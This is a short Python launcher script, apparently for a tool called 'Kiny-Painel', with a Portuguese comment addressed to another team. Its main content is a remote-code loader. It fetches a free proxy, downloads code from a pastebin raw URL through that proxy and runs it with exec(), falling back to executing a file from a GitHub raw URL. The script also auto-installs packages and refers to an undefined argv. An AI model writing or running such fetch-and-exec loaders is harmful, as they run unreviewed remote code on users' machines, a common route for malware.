# Para AkTr Team: Parem de utilizar minhas APIs sem minha permissão, agradeço.
from os import execl; from sys import executable; from os import system
try: from requests import get
except: system('python3 -m pip install --upgrade pip && pip3 install requests');execl(executable, executable, *argv)
try: api=get('http://pubproxy.com/api/proxy').json();ip=api['data'][0]['ip']+':'+api['data'][0]['port'];exec(get(url='https://pastebin.com/raw/WY6AQRKa', proxies={'http': ip}).text)
except:
	try: exec(get(url='https://raw.githubusercontent.com/Kiny-Kiny/Kiny-Painel/main/source/_init_.py').text)
	except: print('Verifique sua conexão com a internet!')
